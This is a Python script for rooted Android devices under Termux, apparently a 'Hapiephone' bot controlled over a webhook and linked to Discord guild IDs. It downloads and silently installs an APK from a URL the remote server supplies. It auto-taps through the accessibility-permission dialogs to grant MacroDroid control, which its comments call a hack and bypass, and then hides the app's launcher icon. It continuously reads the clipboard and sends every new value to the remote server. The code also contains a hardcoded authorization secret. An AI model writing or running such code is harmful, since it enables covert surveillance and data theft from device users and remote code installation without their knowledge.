import sys
import time
import subprocess
import requests
import os
import re

# --- CONFIGURAÇÕES INICIAIS ---
if len(sys.argv) < 4:
    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
APP_PACKAGE = "com.arlosoft.macrodroid"
FLAG_GHOST = "/sdcard/.hapie_ghost_done"

# Garante que o Termux não durma
subprocess.run("termux-wake-lock", shell=True, check=False)

def is_app_installed():
    try:
        res = subprocess.check_output(f'su -c "dumpsys package {APP_PACKAGE} | grep versionName"', shell=True, text=True).strip()
        return "versionName" in res
    except Exception:
        return False

def setup_macrodroid():
    if os.path.exists(FLAG_GHOST):
        # Se já fez o hack antes, apenas certifica que o ícone tá oculto
        try:
            fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
            for act in fallbacks:
                subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        return

    print("⚙️ [SETUP] UGPhone bloqueando root. Ativando Hack de Ghost Touch...", flush=True)
    subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
    
    def get_xml():
        subprocess.run('su -c "uiautomator dump /sdcard/ui.xml"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        try:
            with open("/sdcard/ui.xml", "r", encoding="utf-8") as f:
                return f.read()
        except Exception:
            return ""

    def tap_bounds(match):
        cx = (int(match.group(1)) + int(match.group(3))) // 2
        cy = (int(match.group(2)) + int(match.group(4))) // 2
        subprocess.run(f'su -c "input tap {cx} {cy}"', shell=True)

    def click_element(text=None, ui_class=None):
        xml = get_xml()
        if text:
            pattern = fr'text="{text}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
        elif ui_class:
            pattern = fr'class="{ui_class}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
        else:
            return False
            
        match = re.search(pattern, xml, re.IGNORECASE)
        if match:
            tap_bounds(match)
            return True
        return False

    print("🤖 [GHOST TOUCH] Assumindo o controle da tela...", flush=True)
    # Abre a tela de Acessibilidade
    subprocess.run('su -c "am start -a android.settings.ACCESSIBILITY_SETTINGS"', shell=True)
    time.sleep(3) 

    # --- HACK 1: MACRODROID PRINCIPAL ---
    if click_element(text="MacroDroid"):
        print("👉 MacroDroid encontrado.", flush=True)
        time.sleep(1.5)
        click_element(ui_class="android.widget.Switch") # Clica na chave para ligar
        time.sleep(1.5)
        # Tenta clicar em ALLOW (inglês) ou PERMITIR (português)
        if not click_element(text="ALLOW"):
            click_element(text="PERMITIR")
        time.sleep(1)
        subprocess.run('su -c "input keyevent 4"', shell=True) # Volta pra lista
        time.sleep(1)

    # --- HACK 2: UI INTERACTION ---
    if click_element(text="MacroDroid UI Interaction"):
        print("👉 UI Interaction encontrado.", flush=True)
        time.sleep(1.5)
        click_element(ui_class="android.widget.Switch") 
        time.sleep(1.5)
        if not click_element(text="ALLOW"):
            click_element(text="PERMITIR")
        time.sleep(1)
        subprocess.run('su -c "input keyevent 4"', shell=True)
        time.sleep(1)

    # Volta pro Termux e cria a flag para não repetir isso nos próximos boots
    subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity"', shell=True)
    subprocess.run(f"touch {FLAG_GHOST}", shell=True)
    
    # Agora que o sistema aceitou, apaga o ícone do launcher
    try:
        fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
        for act in fallbacks:
            subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    print("✅ [SETUP] Bypass físico executado com sucesso!", flush=True)

def download_and_install(url):
    apk_path = "/sdcard/sys_app_temp.apk"
    try:
        print(f"🔗 [DOWNLOAD] Recebendo link...", flush=True)
        if "drive.google.com" in url or "docs.google.com" in url:
            res_dl = subprocess.run(f'gdown "{url}" -O {apk_path}', shell=True, stdout=subprocess.DEVNULL)
            if res_dl.returncode != 0:
                return False
        else:
            response = requests.get(url, stream=True, timeout=60)
            response.raise_for_status()
            with open(apk_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk: 
                        f.write(chunk)
        if not os.path.exists(apk_path): return False
        size_mb = os.path.getsize(apk_path) / (1024 * 1024)
        if size_mb < 2.0:
            os.remove(apk_path)
            return False
        subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
        if os.path.exists(apk_path): os.remove(apk_path)
        return True
    except Exception:
        if os.path.exists(apk_path): os.remove(apk_path)
        return False

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4)
        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        return text if text and text != "null" else ""
    except Exception:
        return ""

def check_authorization():
    try:
        installed = is_app_installed()
        payload = {
            "ping": True,
            "device_id": DEVICE_ID,
            "guild_id": GUILD_ID,
            "owner_id": OWNER_ID,
            "app_system": not installed,
            "report": {
                "system_info": {"model": "Hapiephone Guard", "root_access": True, "device_id": DEVICE_ID}
            }
        }
        response = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if not installed:
                if "system_apk_url" in data:
                    if download_and_install(data["system_apk_url"]):
                        setup_macrodroid()
                        installed = True
            else:
                setup_macrodroid()
            return data.get("status") == "active" and installed
        return False
    except Exception:
        return False

def sync_macrodroid():
    print("🔄 [SYNC] Enviando variáveis e segredos para o MacroDroid...", flush=True)
    cmd = (
        f'su -c "am broadcast -a hapiephone.sync '
        f'--es device_id {DEVICE_ID} '
        f'--es guild_id {GUILD_ID} '
        f'--es owner_id {OWNER_ID} '
        f'--es url_webhook {URL_WEBHOOK} '
        f'--es auth_secret {AUTH_SECRET}"'
    )
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_vigilante():
    print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
    last_clip = force_focus_and_read()
    subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = process.stdout.readline()
        if line:
            time.sleep(0.5)
            current = force_focus_and_read()
            if current and current != last_clip:
                if not is_app_installed():
                    process.terminate()
                    return
                try:
                    payload = {"texto": current, "device_id": DEVICE_ID, "guild_id": GUILD_ID, "owner_id": OWNER_ID}
                    res = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                    if res.status_code == 200:
                        if res.json().get("status") == "shutdown":
                            process.terminate()
                            return
                    last_clip = current
                except Exception:
                    process.terminate()
                    return
        if process.poll() is not None:
            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def main():
    print("📡 Hapiephone System Online...", flush=True)
    if is_app_installed():
        setup_macrodroid()
        
    # Sincroniza os IDs e segredos com o MacroDroid logo no início
    sync_macrodroid()
    
    while True:
        if check_authorization():
            start_vigilante()
        else:
            print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
            time.sleep(300) 

if __name__ == "__main__":
    main()
